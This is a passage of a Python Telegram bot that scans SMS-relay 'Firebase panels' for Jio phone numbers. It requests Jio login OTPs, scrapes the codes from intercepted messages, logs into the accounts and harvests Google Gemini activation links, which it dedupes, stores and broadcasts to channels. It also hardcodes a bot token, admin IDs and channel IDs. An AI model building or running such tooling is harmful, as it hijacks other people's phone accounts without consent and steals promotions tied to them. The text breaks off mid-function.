"""
Jio Gemini Scanner Bot - Deep Scanning Edition with Terminal Log Streaming
High-resilience Firebase panel explorer, Jio OTP automator, Google Gemini activation link extractor,
and live Telegram Channel Terminal Log Streamer.
"""

import os
import random
import asyncio
import threading
import logging
import re
import csv
import time
import html
import json
import queue
import gc
import ctypes
import io
import shutil
from pathlib import Path
from datetime import datetime, timezone, timedelta
from collections import defaultdict, OrderedDict
from urllib.parse import unquote, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, Any, Optional, Set, List, Tuple

# Load environment variables if available
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from telegram import Update, Message, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
    ConversationHandler,
)
from telegram.constants import ParseMode
from telegram.error import RetryAfter, TelegramError, TimedOut, NetworkError
import warnings
from telegram.warnings import PTBUserWarning

warnings.filterwarnings("ignore", category=PTBUserWarning)

from admin_manager import admin_manager

# ============ CONFIGURATION ============
JIO_DEFAULT_TOKEN = "8905621538:AAFRw0UJLm-JPear_6rXhR204UiNCyMq2ow"
_raw_token = os.getenv("BOT_TOKEN", "").strip()
if not _raw_token or "8538201990" in _raw_token:
    BOT_TOKEN = JIO_DEFAULT_TOKEN
else:
    BOT_TOKEN = _raw_token

def parse_admin_ids() -> List[int]:
    raw = os.getenv("ADMIN_USER_IDS", "").strip()
    admins = [8327850869]
    if raw:
        for uid in raw.replace(",", " ").split():
            clean_uid = uid.strip().lstrip("-")
            if clean_uid.isdigit():
                admins.append(int(uid.strip()))
    return list(set(admins))

ADMIN_USER_IDS = parse_admin_ids()
ALLOW_ALL_ADMINS = os.getenv("ALLOW_ALL_ADMINS", "false").strip().lower() in ("true", "1", "yes")

# Scanner Tuning
MESSAGE_LIMIT = int(os.getenv("MESSAGE_LIMIT", "150"))
DEFAULT_OTP_TIMEOUT = int(os.getenv("OTP_TIMEOUT", "18"))
DEFAULT_MAX_RETRIES = int(os.getenv("MAX_OTP_RETRIES", "1"))
OTP_TIMEOUT = DEFAULT_OTP_TIMEOUT
MAX_OTP_RETRIES = DEFAULT_MAX_RETRIES
POLL_INTERVAL = int(os.getenv("POLL_INTERVAL", "1"))
REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "5"))
TIMEZONE_OFFSET_HOURS = float(os.getenv("TIMEZONE_OFFSET_HOURS", "5.5"))  # Default IST UTC+5:30

# Shared Global Concurrency & Rate Limiters
_SCAN_EXECUTOR = ThreadPoolExecutor(max_workers=6, thread_name_prefix="ScanWorker")
_SHALLOW_EXECUTOR = ThreadPoolExecutor(max_workers=4, thread_name_prefix="ShallowWorker")
_jio_otp_lock: Optional[asyncio.Lock] = None

def get_jio_otp_lock() -> asyncio.Lock:
    global _jio_otp_lock
    if _jio_otp_lock is None:
        _jio_otp_lock = asyncio.Lock()
    return _jio_otp_lock

_last_jio_req_time: float = 0.0
_jio_global_cooldown_until: float = 0.0
_jio_consecutive_429: int = 0
_cache_lock = threading.Lock()
device_path_cache: OrderedDict[str, str] = OrderedDict()
MAX_DEVICE_PATH_CACHE = 500

def get_cached_device_path(cache_key: str) -> Optional[str]:
    with _cache_lock:
        if cache_key in device_path_cache:
            device_path_cache.move_to_end(cache_key)
            return device_path_cache[cache_key]
    return None

def set_cached_device_path(cache_key: str, path: str):
    with _cache_lock:
        if cache_key in device_path_cache:
            device_path_cache.move_to_end(cache_key)
        device_path_cache[cache_key] = path
        if len(device_path_cache) > MAX_DEVICE_PATH_CACHE:
            device_path_cache.popitem(last=False)

def force_memory_cleanup():
    """Forces Python cyclic garbage collection and trims glibc heap arenas back to OS."""
    try:
        gc.collect()
        libc = ctypes.CDLL("libc.so.6")
        libc.malloc_trim(0)
    except Exception:
        pass


SCAN_CONFIG = {
    "mode": "turbo",       # "turbo" (18s timeout, 1 retry) or "deep" (15s timeout, 2 retries on Jio numbers)
    "timeout": DEFAULT_OTP_TIMEOUT,
    "retries": DEFAULT_MAX_RETRIES
}

# Jio Endpoints
SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
ACTIVATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"

# Files & Workspaces
BASE_DIR = Path(__file__).parent.resolve()
USER_DATA_DIR = BASE_DIR / "user_data"
PANELS_FILE = BASE_DIR / "panels.txt"
LINKS_FILE = BASE_DIR / "gemini_activation_links.txt"
FRESH_LINKS_FILE = BASE_DIR / "gemini_fresh_links.txt"
RESULTS_FILE = BASE_DIR / "gemini_results.csv"
SETTINGS_FILE = BASE_DIR / "settings.json"
SCAN_STATE_FILE = BASE_DIR / "scan_state.json"
PROCESSED_NUMBERS_FILE = BASE_DIR / "processed_numbers.json"

def get_user_data_dir(user_id: int) -> Path:
    d = USER_DATA_DIR / str(user_id)
    d.mkdir(parents=True, exist_ok=True)
    return d

def get_user_panels_file(user_id: Optional[int] = None) -> Path:
    if not user_id:
        return PANELS_FILE
    pfile = get_user_data_dir(user_id) / "panels.txt"
    if admin_manager.is_super_admin(user_id) and (not pfile.exists() or pfile.stat().st_size == 0) and PANELS_FILE.exists() and PANELS_FILE.stat().st_size > 0:
        try:
            import shutil
            shutil.copy2(PANELS_FILE, pfile)
            logger.info(f"Initialized workspace panels for Super Admin {user_id} from master panels.txt")
        except Exception as e:
            logger.warning(f"Failed to copy master panels.txt for Super Admin {user_id}: {e}")
    return pfile

def get_user_links_file(user_id: Optional[int] = None) -> Path:
    if not user_id:
        return LINKS_FILE
    lfile = get_user_data_dir(user_id) / "gemini_activation_links.txt"
    if admin_manager.is_super_admin(user_id) and not lfile.exists() and LINKS_FILE.exists():
        try:
            import shutil
            shutil.copy2(LINKS_FILE, lfile)
        except Exception:
            pass
    return lfile

def get_user_fresh_links_file(user_id: Optional[int] = None) -> Path:
    if not user_id:
        return FRESH_LINKS_FILE
    return get_user_data_dir(user_id) / "gemini_fresh_links.txt"

# ============ GLOBAL & MULTI-USER DEDUPLICATION ENGINE ============
_PROCESSED_LOCK = threading.RLock()
_PROCESSED_CACHE: Dict[str, dict] = {}
_PROCESSED_SEEDED = False

# LIFETIME CAPTURED LINKS REPOSITORY (Strict protection against unredeemed/duplicate links)
_LIFETIME_CAPTURED_URLS: Set[str] = set()
_LIFETIME_CAPTURED_TOKENS: Set[str] = set()

STATUS_COOLDOWN_HOURS = {
    "success": 720.0,            # 30 days (Once a SIM yields an activation link, it cannot yield another)
    "duplicate_unredeemed": 720.0, # 30 days (Unredeemed link already in lifetime archive; suppress re-testing)
    "already_active": 48.0,      # 48 hours (Google AI already redeemed; re-check after 2 days)
    "no_url": 6.0,               # 6 hours (Allows re-testing in subsequent scans for newly recharged plans)
    "not_jio_number": 6.0,       # 6 hours (Temporary carrier mismatch or network glitch)
    "rate_limited": 0.25,        # 15 minutes (Jio rate limit backoff)
    "otp_failed": 1.0,           # 1 hour (Temporary SMS / network delay)
    "otp_send_failed": 1.0,      # 1 hour (Rate limit or network hiccup)
    "auth_failed": 1.0,          # 1 hour (Transient session or Jio portal hiccup)
}

# In-flight concurrency shield: Prevents two simultaneous scans from testing the same SIM at once
_IN_FLIGHT_NUMBERS: Set[str] = set()
_IN_FLIGHT_LOCK = threading.Lock()

def acquire_in_flight_number(mobile: str) -> bool:
    clean_mob = re.sub(r"\D", "", str(mobile))[-10:]
    if not clean_mob or len(clean_mob) != 10:
        return False
    with _IN_FLIGHT_LOCK:
        if clean_mob in _IN_FLIGHT_NUMBERS:
            return False
        _IN_FLIGHT_NUMBERS.add(clean_mob)
        return True

def release_in_flight_number(mobile: str):
    clean_mob = re.sub(r"\D", "", str(mobile))[-10:]
    if not clean_mob:
        return
    with _IN_FLIGHT_LOCK:
        _IN_FLIGHT_NUMBERS.discard(clean_mob)


def extract_link_token(url: str) -> str:
    """Extracts unique token from Google AI activation link for robust deduplication."""
    if not url:
        return ""
    u = url.strip().rstrip(".\"';")
    m = re.search(r"/new/([A-Za-z0-9_\-+=]+)", u)
    if m:
        return m.group(1).rstrip(".\"';")
    m2 = re.search(r"[?&](?:token|code)=([A-Za-z0-9_\-+=]+)", u)
    if m2:
        return m2.group(1).rstrip(".\"';")
    m3 = re.search(r"/promo/([A-Za-z0-9_\-+=]+)", u)
    if m3:
        return m3.group(1).rstrip(".\"';")
    return u

def is_url_previously_captured(url: str) -> bool:
    """Checks if activation link or its token was already captured previously across any scan/user."""
    if not url:
        return False
    u = url.strip().rstrip(".\"';")
    tok = extract_link_token(u)
    with _PROCESSED_LOCK:
        if u in _LIFETIME_CAPTURED_URLS:
            return True
        if tok and tok in _LIFETIME_CAPTURED_TOKENS:
            return True
        for t in _LIFETIME_CAPTURED_TOKENS:
            if len(t) > 20 and t in u:
                return True
    return False

def register_captured_url(url: str):
    """Registers a fresh URL into lifetime deduplication sets."""
    if not url:
        return
    u = url.strip()
    tok = extract_link_token(u)
    with _PROCESSED_LOCK:
        _LIFETIME_CAPTURED_URLS.add(u)
        if tok:
            _LIFETIME_CAPTURED_TOKENS.add(tok)

def get_user_processed_file(user_id: Optional[int] = None) -> Path:
    if not user_id:
        return PROCESSED_NUMBERS_FILE
    return get_user_data_dir(user_id) / "processed_numbers.json"

def load_processed_numbers(user_id: Optional[int] = None) -> dict:
    fpath = get_user_processed_file(user_id)
    if fpath.exists():
        try:
            with open(fpath, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_processed_numbers(user_id: Optional[int], data: dict):
    fpath = get_user_processed_file(user_id)
    tmp = fpath.with_suffix(f".tmp.{os.getpid()}.{time.time_ns()}")
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        tmp.replace(fpath)
    except Exception as e:
        logger.debug(f"Failed to save processed numbers for user {user_id}: {e}")
        try:
            if tmp.exists():
                tmp.unlink()
        except Exception:
            pass

def seed_processed_numbers_from_history():
    """
    On startup or first scan, aggregates historical records from all CSV and link files.
    1. Loads all historical links into _LIFETIME_CAPTURED_URLS / _LIFETIME_CAPTURED_TOKENS
       so that duplicate/unredeemed links are NEVER delivered again.
    2. Seeds ONLY verified 'success' (30d cooldown) and recent 'already_active' (7d cooldown).
       NEVER seeds temporary failures ('not_jio_number', 'no_url', 'otp_failed') from history,
       which was mistakenly skipping thousands of active devices across panels.
    """
    global _PROCESSED_CACHE, _PROCESSED_SEEDED
    with _PROCESSED_LOCK:
        if _PROCESSED_SEEDED:
            return

        now = time.time()

        # 1. Harvest ALL lifetime URLs from text files across repository
        link_candidates = list(BASE_DIR.glob("*activation_links*.txt"))
        if USER_DATA_DIR.exists():
            link_candidates.extend(USER_DATA_DIR.glob("*/*activation_links*.txt"))

        for lf in link_candidates:
            if "fresh" in lf.name.lower():
                continue
            try:
                with open(lf, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        m_url = ACTIVATION_PATTERN.search(line)
                        if m_url:
                            u_str = m_url.group(0).rstrip(".\"';")
                            _LIFETIME_CAPTURED_URLS.add(u_str)
                            t_str = extract_link_token(u_str)
                            if t_str:
                                _LIFETIME_CAPTURED_TOKENS.add(t_str)
                        elif "http" in line:
                            parts = line.split("|")
                            target_part = parts[-1].strip()
                            if target_part.startswith("http"):
                                _LIFETIME_CAPTURED_URLS.add(target_part)
                                t_str = extract_link_token(target_part)
                                if t_str:
                                    _LIFETIME_CAPTURED_TOKENS.add(t_str)
            except Exception as e:
                logger.debug(f"Error loading lifetime links from {lf}: {e}")

        # 2. Harvest URLs from all activation_links_with_numbers*.txt files into _PROCESSED_CACHE
        txt_num_candidates = list(BASE_DIR.glob("*activation_links_with_numbers*.txt"))
        if USER_DATA_DIR.exists():
            txt_num_candidates.extend(USER_DATA_DIR.glob("*/*activation_links_with_numbers*.txt"))
        for tf in txt_num_candidates:
            try:
                mtime = tf.stat().st_mtime
                with open(tf, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        m = re.search(r"\+?91\s*(\d{10})\s*\|\s*(https?://\S+)", line)
                        if m:
                            mob = m.group(1)
                            url = m.group(2).rstrip(".\"';")
                            _LIFETIME_CAPTURED_URLS.add(url)
                            t_str = extract_link_token(url)
                            if t_str:
                                _LIFETIME_CAPTURED_TOKENS.add(t_str)
                            if mob not in _PROCESSED_CACHE:
                                _PROCESSED_CACHE[mob] = {
                                    "status": "success",
                                    "ts": mtime,
                                    "date": "Historical Archive",
                                    "url": url,
                                    "user_id": 0
                                }
            except Exception as e:
                logger.debug(f"Error seeding from TXT {tf}: {e}")

        def parse_dt(d_str, t_str):
            for fmt in ("%Y-%m-%d %I:%M:%S %p", "%Y-%m-%d %H:%M:%S", "%d-%m-%Y %I:%M:%S %p"):
                try:
                    return datetime.strptime(f"{d_str} {t_str}".strip(), fmt).timestamp()
                except Exception:
                    pass
            return 0.0

        # 3. Seed from CSV files: ONLY 'success' and recent 'already_active' (<= 7 days)
        csv_candidates = list(BASE_DIR.glob("gemini_results*.csv"))
        if USER_DATA_DIR.exists():
            csv_candidates.extend(USER_DATA_DIR.glob("*/gemini_results*.csv"))

        seeded_count = 0
        for cf in csv_candidates:
            uid = 0
            if "user_data" in cf.parts:
                try:
                    uid = int(cf.parts[cf.parts.index("user_data") + 1])
                except Exception:
                    pass
            try:
                with open(cf, "r", encoding="utf-8", errors="ignore") as f:
                    reader = csv.reader(f)
                    header = next(reader, None)
                    for row in reader:
                        if len(row) < 4:
                            continue
                        raw_mob = row[2] if len(row) > 2 else ""
                        clean_mob = re.sub(r"\D", "", str(raw_mob))[-10:]
                        if len(clean_mob) != 10:
                            continue
                        status = row[3].strip() if len(row) > 3 else ""
                        url = row[4].strip() if len(row) > 4 else ""
                        d_str = row[5].strip() if len(row) > 5 else ""
                        t_str = row[6].strip() if len(row) > 6 else ""
                        ts = parse_dt(d_str, t_str)
                        if ts <= 0:
                            try:
                                ts = cf.stat().st_mtime
                            except Exception:
                                ts = now

                        if url:
                            clean_u = url.rstrip(".\"';")
                            _LIFETIME_CAPTURED_URLS.add(clean_u)
                            tok = extract_link_token(clean_u)
                            if tok:
                                _LIFETIME_CAPTURED_TOKENS.add(tok)

                        # CRITICAL: Only seed verified 'success' from historical archives!
                        # Do NOT seed historical 'already_active', 'not_jio_number', or 'no_url' from CSVs,
                        # which was mistakenly suppressing thousands of active devices across the 538 panels.
                        if status == "success":
                            _PROCESSED_CACHE[clean_mob] = {
                                "status": "success",
                                "ts": ts,
                                "date": f"{d_str} {t_str}".strip(),
                                "url": url,
                                "user_id": uid
                            }
                            seeded_count += 1
            except Exception as e:
                logger.debug(f"Error seeding from CSV {cf}: {e}")

        # 4. Load existing master processed_numbers.json, keeping only valid success records
        master_file = PROCESSED_NUMBERS_FILE
        if master_file.exists():
            try:
                with open(master_file, "r", encoding="utf-8") as f:
                    master_data = json.load(f)
                    if isinstance(master_data, dict):
                        for k, v in master_data.items():
                            st = v.get("status")
                            if st == "success":
                                _PROCESSED_CACHE[k] = v
                                if v.get("url"):
                                    u_c = v["url"].strip()
                                    _LIFETIME_CAPTURED_URLS.add(u_c)
                                    tok = extract_link_token(u_c)
                                    if tok:
                                        _LIFETIME_CAPTURED_TOKENS.add(tok)
            except Exception as e:
                logger.debug(f"Error loading master processed numbers: {e}")

        # 5. Persist pruned consolidated master file
        try:
            save_processed_numbers(None, _PROCESSED_CACHE)
        except Exception as e:
            logger.debug(f"Error saving pruned master processed numbers: {e}")

        _PROCESSED_SEEDED = True
        logger.info(f"🛡️ Seeded processed database: {len(_PROCESSED_CACHE)} active numbers, {len(_LIFETIME_CAPTURED_URLS)} lifetime unique URLs protected from duplication.")

def check_number_processed(user_id: Optional[int], mobile: str, custom_cooldown_hours: Optional[float] = None) -> Tuple[bool, str, dict]:
    clean_mob = re.sub(r"\D", "", str(mobile))[-10:]
    if not clean_mob or len(clean_mob) != 10:
        return False, "", {}

    if not _PROCESSED_SEEDED:
        seed_processed_numbers_from_history()

    with _PROCESSED_LOCK:
        entry = _PROCESSED_CACHE.get(clean_mob)

    if not entry:
        return False, "", {}

    status = entry.get("status", "success")
    ts = entry.get("ts", 0.0)
    now = time.time()

    if custom_cooldown_hours is not None:
        limit_hours = custom_cooldown_hours
    else:
        limit_hours = STATUS_COOLDOWN_HOURS.get(status, 1.0)

    # Time-bounded cooldowns (fair and transparent, no permanent locks)
    elapsed_hours = (now - ts) / 3600.0
    if elapsed_hours < limit_hours:
        return True, status, entry

    return False, "", {}

def record_number_processed(user_id: Optional[int], mobile: str, status: str, url: str = ""):
    clean_mob = re.sub(r"\D", "", str(mobile))[-10:]
    if not clean_mob or len(clean_mob) != 10:
        return

    d, t = get_current_time()
    entry = {
        "status": status,
        "ts": time.time(),
        "date": f"{d} {t}",
        "url": url,
        "user_id": user_id or 0
    }

    with _PROCESSED_LOCK:
        _PROCESSED_CACHE[clean_mob] = entry

    # Update user's local file
    if user_id:
        try:
            u_rec = load_processed_numbers(user_id)
            u_rec[clean_mob] = entry
            save_processed_numbers(user_id, u_rec)
        except Exception as e:
            logger.debug(f"Error saving user processed number: {e}")

    # Update global master file
    try:
        master_rec = load_processed_numbers(None)
        master_rec[clean_mob] = entry
        save_processed_numbers(None, master_rec)
    except Exception as e:
        logger.debug(f"Error saving master processed number: {e}")

def clear_processed_numbers(user_id: Optional[int] = None):
    """
    Clears failure/temporary cooldown caches globally, unblocking all panels and devices.
    Preserves verified 'success' cooldowns and lifetime captured URLs so duplicate links are never delivered.
    """
    global _PROCESSED_CACHE
    fpath = get_user_processed_file(user_id)
    if fpath.exists():
        try:
            fpath.unlink()
        except Exception:
            pass
    with _PROCESSED_LOCK:
        # Keep only verified success numbers
        _PROCESSED_CACHE = {k: v for k, v in _PROCESSED_CACHE.items() if v.get("status") == "success"}
        try:
            save_processed_numbers(None, _PROCESSED_CACHE)
        except Exception:
            pass
    logger.info("🧹 Deduplication cooldown cache cleared! All panels & devices are 100% re-eligible for scanning.")

def get_user_results_file(user_id: Optional[int] = None) -> Path:
    if not user_id:
        return RESULTS_FILE
    rfile = get_user_data_dir(user_id) / "gemini_results.csv"
    if admin_manager.is_super_admin(user_id) and not rfile.exists() and RESULTS_FILE.exists():
        try:
            import shutil
            shutil.copy2(RESULTS_FILE, rfile)
        except Exception:
            pass
    return rfile

def get_user_scan_state_file(user_id: Optional[int] = None) -> Path:
    if not user_id:
        return SCAN_STATE_FILE
    return get_user_data_dir(user_id) / "scan_state.json"

def get_user_settings_file(user_id: Optional[int] = None) -> Path:
    if not user_id:
        return SETTINGS_FILE
    return get_user_data_dir(user_id) / "settings.json"

def load_user_settings(user_id: Optional[int] = None) -> dict:
    fpath = get_user_settings_file(user_id)
    if fpath.exists():
        try:
            with open(fpath, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_user_settings(user_id: Optional[int], settings: dict):
    fpath = get_user_settings_file(user_id)
    try:
        with open(fpath, "w", encoding="utf-8") as f:
            json.dump(settings, f, indent=2)
    except Exception as e:
        logger.error(f"Failed to save settings for user {user_id}: {e}")


# Patterns
OTP_PATTERNS = [
    # 1. Dash-separated 6-digit code (e.g. 123-456)
    re.compile(r"(?:otp|code|pin|password|secret|passcode|verif)[\s\S]{0,30}?\b([0-9]{3})-([0-9]{3})\b", re.IGNORECASE),
    # 2. Specific keywords followed by 6 digits
    re.compile(r"(?:otp|code|pin|password|secret|passcode|verification|one\s*time\s*password)[\s:is\-#]+([0-9]{6})\b", re.IGNORECASE),
    # 3. 6 digits followed by "is your ... OTP / code"
    re.compile(r"\b([0-9]{6})\b\s*(?:is\s+)?(?:your|the)?\s*(?:otp|code|pin|password|secret|passcode|verif|one\s*time\s*password|login)", re.IGNORECASE),
    # 4. Proximity matching within 50 characters of keyword
    re.compile(r"(?:otp|code|pin|password|secret|passcode|verification|myjio|jio)[\s\S]{0,50}?\b([0-9]{6})\b", re.IGNORECASE),
    re.compile(r"\b([0-9]{6})\b[\s\S]{0,50}?(?:otp|code|pin|password|secret|passcode|verification|myjio|jio)", re.IGNORECASE),
    # 5. Generic 6-digit fallback
    re.compile(r"\b([0-9]{6})\b")
]

PHONE_PATTERN = re.compile(r"(?:(?:\+?91[\s\-]?)|\b0)?([6-9]\d{9})\b")
JIO_NUMBER_PATTERNS = [
    re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})\b"),
    re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})\b"),
    re.compile(r"(?i)\b(?:your|for)\s+(?:jio\s+)?(?:mobile|number|no)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})\b"),
    re.compile(r"(?i)\bmyjio\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})\b")
]
ACTIVATION_PATTERN = re.compile(
    r"https?://(?:serviceactivation\.google\.com/subscription/new/[A-Za-z0-9_\-\.\?&=+%]+|one\.google\.com/promo/[A-Za-z0-9_\-\.\?&=+%]+)",
    re.IGNORECASE
)

# Setup Console Logging
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ============ CHANNEL LOG STREAMING SYSTEM ============
log_queue = queue.Queue(maxsize=2500)

class TelegramLogHandler(logging.Handler):
    """
    Captures console/terminal logs and queues them for streaming to a configured Telegram channel.
    Filters out internal HTTP/telegram transport polling to prevent recursive loops.
    """
    def emit(self, record: logging.LogRecord):
        # Ignore noisy internal framework polling logs to avoid feedback loops
        if record.name.startswith(("httpx", "httpcore", "telegram", "urllib3", "asyncio")):
            return
        try:
            msg = self.format(record)
            if not log_queue.full():
                log_queue.put_nowait((record.levelno, msg))
        except Exception:
            self.handleError(record)

telegram_log_handler = TelegramLogHandler()
telegram_log_handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S"))
telegram_log_handler.setLevel(logging.INFO)
logging.getLogger().addHandler(telegram_log_handler)

def load_settings() -> dict:
    if SETTINGS_FILE.exists():
        try:
            with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_settings(settings: dict):
    try:
        with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(settings, f, indent=2)
    except Exception as e:
        logger.error(f"Failed to save settings: {e}")

DEFAULT_STORAGE_CHANNEL = "-1003907841421"
DEFAULT_LOG_CHANNEL = "-1003946923981"

def get_storage_channel() -> str:
    return admin_manager.get_master_storage_channel()

def set_storage_channel(channel_id: Optional[str]):
    if channel_id:
        admin_manager.set_master_storage_channel(channel_id)

def get_log_channel() -> Optional[str]:
    return admin_manager.get_master_log_channel()

def set_log_channel(channel_id: Optional[str]):
    if channel_id:
        admin_manager.set_master_log_channel(channel_id)

async def log_streamer_task(bot):
    """
    Background worker that flushes queued terminal logs to their appropriate Telegram channels.
    Routes user-specific logs ([User <uid>]) to that user's isolated user_log_channel.
    Routes system logs and Super Admin logs to the master_log_channel.
    Batches lines into code blocks and respects Telegram rate limits.
    """
    buffer = []
    last_flush = time.time()
    user_re = re.compile(r"\[User\s+(\d+)\]")

    while True:
        try:
            # Drain queue into buffer
            while not log_queue.empty():
                try:
                    buffer.append(log_queue.get_nowait())
                except queue.Empty:
                    break

            if len(buffer) > 100:
                buffer = buffer[-100:]

            now = time.time()
            if buffer and ((now - last_flush) >= 2.5 or len(buffer) >= 15):
                master_ch = get_log_channel()
                super_uid = admin_manager.super_admin_id
                channel_buffers = defaultdict(list)

                for lvl, line in buffer:
                    m = user_re.search(line)
                    target_ch = None
                    if m:
                        uid = int(m.group(1))
                        u_log_ch = admin_manager.get_user_log_channel(uid)
                        if u_log_ch:
                            target_ch = u_log_ch
                        elif uid == super_uid:
                            target_ch = master_ch
                        else:
                            # User does not have a private channel: do not spam master channel with scan logs
                            target_ch = None
                    else:
                        target_ch = master_ch

                    if target_ch:
                        channel_buffers[target_ch].append((lvl, line))

                for ch_id, ch_lines in channel_buffers.items():
                    if not ch_lines:
                        continue
                    lines = []
                    for lvl, line in ch_lines:
                        prefix = "ℹ️"
                        if lvl >= logging.ERROR:
                            prefix = "🔴"
                        elif lvl >= logging.WARNING:
                            # Routine rate limits, cooldowns, or no_url checks should not show as yellow warnings
                            if any(x in line.lower() for x in ("rate limit", "429", "no_url", "cooldown", "status 429", "status 400", "flood control", "duplicate", "battery", "otp rejected")):
                                prefix = "ℹ️"
                            else:
                                prefix = "🟡"
                        elif "SUCCESS" in line:
                            prefix = "🟢"
                        lines.append(f"{prefix} {html.escape(line)}")

                    while lines and sum(len(l) + 1 for l in lines) > 3500:
                        lines.pop(0)

                    if lines:
                        batch_text = "\n".join(lines)
                        if len(batch_text) > 3800:
                            batch_text = batch_text[-3800:]
                        msg_text = f"📟 <b>Terminal Logs</b>\n\n<pre>{batch_text}</pre>"
                        try:
                            await bot.send_message(
                                chat_id=ch_id,
                                text=msg_text,
                                parse_mode=ParseMode.HTML,
                                disable_web_page_preview=True,
                                write_timeout=10,
                                connect_timeout=10
                            )
                        except Exception as e:
                            logger.debug(f"Failed to stream logs to channel {ch_id}: {e}")

                buffer.clear()
                last_flush = now

            await asyncio.sleep(1.0)
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.debug(f"Error in log streamer task: {e}")
            await asyncio.sleep(2.0)

# ============ SCANNER STATE & ISOLATED SESSION ENGINE ============
class UserScanSession:
    def __init__(self, user_id: int, chat_id: int, progress_msg_id: int, is_deep: bool = True):
        self.user_id: int = user_id
        self.chat_id: int = chat_id
        self.progress_msg_id: int = progress_msg_id
        self.is_deep: bool = is_deep
        self.stop_requested: bool = False
        self.task: Optional[asyncio.Task] = None
        self.last_progress_time: float = 0.0
        self.stats: dict = {
            "start_time": time.time(),
            "total_panels": 0,
            "online_devices": 0,
            "total_targets": 0,
            "current_index": 0,
            "current_mobile": "",
            "success_count": 0,
            "failed_count": 0,
            "is_deep": is_deep,
            "batch_times": [],
            "last_batch_idx": 0,
            "total_batches": 0,
            "recent_captures": []
        }
        self.user_info: dict = {}

    def is_active(self) -> bool:
        return not self.stop_requested and self.task is not None and not self.task.done()

active_scans: Dict[int, UserScanSession] = {}
user_scan_configs: Dict[int, dict] = {}

def get_user_session(user_id: int) -> Optional[UserScanSession]:
    return active_scans.get(user_id)

def is_user_scanning(user_id: int) -> bool:
    s = active_scans.get(user_id)
    return s is not None and s.is_active()

def get_user_scan_config(user_id: int) -> dict:
    if user_id not in user_scan_configs:
        u_sett = load_user_settings(user_id)
        mode = u_sett.get("scan_mode", SCAN_CONFIG.get("mode", "deep"))
        user_scan_configs[user_id] = {
            "mode": mode,
            "timeout": 18 if mode == "turbo" else 15,
            "retries": 1 if mode == "turbo" else 2
        }
    return user_scan_configs[user_id]

def toggle_user_scan_mode(user_id: int) -> str:
    cfg = get_user_scan_config(user_id)
    if cfg["mode"] == "turbo":
        cfg["mode"] = "deep"
        cfg["retries"] = 2
        cfg["timeout"] = 15
    else:
        cfg["mode"] = "turbo"
        cfg["retries"] = 1
        cfg["timeout"] = 18
    u_sett = load_user_settings(user_id)
    u_sett["scan_mode"] = cfg["mode"]
    save_user_settings(user_id, u_sett)
    return cfg["mode"]

async def broadcast_success(bot, mobile: str, url: str, session_or_user: Any = None):
    """Broadcasts victory card with 1-Tap browser activation button to isolated channels and chat."""
    if isinstance(session_or_user, UserScanSession):
        session = session_or_user
        user_id = session.user_id
        u_info = session.user_info
        scan_stats = session.stats
        target_chat_id = session.chat_id
    elif isinstance(session_or_user, dict):
        session = None
        user_id = session_or_user.get("user_id", 0)
        u_info = session_or_user
        scan_stats = {}
        target_chat_id = session_or_user.get("chat_id")
    else:
        session = None
        user_id = 0
        u_info = {}
        scan_stats = {}
        target_chat_id = None

    author_str = ""
    if u_info:
        u_name = u_info.get("username")
        fname = u_info.get("first_name") or "User"
        tag = f"@{u_name}" if u_name else f"{fname} ({user_id})"
        author_str = f"\n👤 <b>Scanned By:</b> {html.escape(tag)}"

    tm = get_current_time()[1]
    if scan_stats is not None:
        scan_stats.setdefault("recent_captures", []).append({
            "mobile": mobile,
            "time": tm,
            "url": url
        })
        scan_stats["recent_captures"] = scan_stats["recent_captures"][-5:]

    total_cap = scan_stats.get("success_count", 0) if scan_stats else 0
    lifetime_count = 0
    try:
        lfile = get_user_links_file(user_id) if user_id else LINKS_FILE
        if lfile.exists():
            lifetime_count = len([line for line in lfile.read_text(encoding="utf-8", errors="ignore").splitlines() if line.strip()])
    except Exception:
        lifetime_count = 0

    count_str = f"\n🎯 <b>Batch Captures:</b> <code>#{total_cap}</code>" if total_cap > 0 else ""
    if lifetime_count > 0:
        count_str += f" <i>(Total: #{lifetime_count})</i>"

    text = f"""🎉 <b>GEMINI ACTIVATION LINK CAPTURED!</b>

📱 <b>Mobile:</b> <code>+91 {mobile}</code>
⏰ <b>Time:</b> <code>{tm} (IST)</code>{count_str}{author_str}

🔗 <b>Activation Link:</b>
<code>{html.escape(url)}</code>"""

    act_url = url.strip()
    btn_markup = None
    if act_url.startswith("http://") or act_url.startswith("https://"):
        try:
            btn_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("🚀 Activate Gemini (1-Tap)", url=act_url)]
            ])
        except Exception:
